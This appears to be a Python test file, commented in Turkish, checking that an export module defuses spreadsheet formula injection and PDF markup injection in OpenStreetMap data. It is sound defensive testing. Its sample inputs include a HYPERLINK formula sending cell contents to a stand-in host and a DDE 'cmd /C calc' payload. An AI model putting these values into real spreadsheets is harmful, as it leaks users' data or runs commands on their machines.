"""
Disa aktarimda OSM'den gelen (herkesin duzenleyebildigi) metin, acilan
dosyada kod gibi calismamali: Excel/CSV formul enjeksiyonu ve PDF
isaretleme kacisi.
"""

import io
from datetime import datetime, timezone

from openpyxl import load_workbook

from app.export_formats import safe_cell, to_csv, to_pdf, to_xlsx

NOW = datetime(2026, 9, 27, tzinfo=timezone.utc)
EVIL = '=HYPERLINK("http://kotu.example/?d="&A1,"tikla")'


def _item(name: str, **tags) -> dict:
    return {"id": "osm:node:1", "name": name, "type": "hotel", "lat": 41.0, "lon": 29.0, "address": "", "tags": tags}


class TestFormulEnjeksiyonu:
    def test_formul_gibi_baslayan_metin_isaretlenir(self):
        for value in (EVIL, "+cmd|' /C calc'!A0", "-1+A1", "@SUM(A1)", "\t=1"):
            assert safe_cell(value) == "'" + value

    def test_telefon_ve_duz_metin_degismez(self):
        for value in ("+90 216 333 44 55", "-", "Şişli Otel", "41.000000, 29.000000", ""):
            assert safe_cell(value) == value

    def test_csv_hucresi_formul_olarak_yazilmaz(self):
        text = to_csv([_item(EVIL, phone="=1+1")]).decode("utf-8-sig")
        row = text.splitlines()[1]
        assert row.startswith("'=HYPERLINK") or row.startswith("\"'=HYPERLINK")
        assert ";'=1+1;" in row

    def test_excel_hucresi_metin_kalir(self):
        wb = load_workbook(io.BytesIO(to_xlsx([_item(EVIL)], "=CMD()", NOW)))
        cell = wb["Kayıtlar"]["A2"]
        assert cell.value == EVIL and cell.data_type == "s"
        assert wb["Bilgi"]["A1"].data_type == "s"


class TestPdfIsaretleme:
    def test_tirnakli_web_adresi_pdfi_bozmaz(self):
        item = _item('Otel "x"', website='https://ornek.com" color="red', phone='+90 5x" <b>')
        assert to_pdf([item], "Başlık", NOW).startswith(b"%PDF")
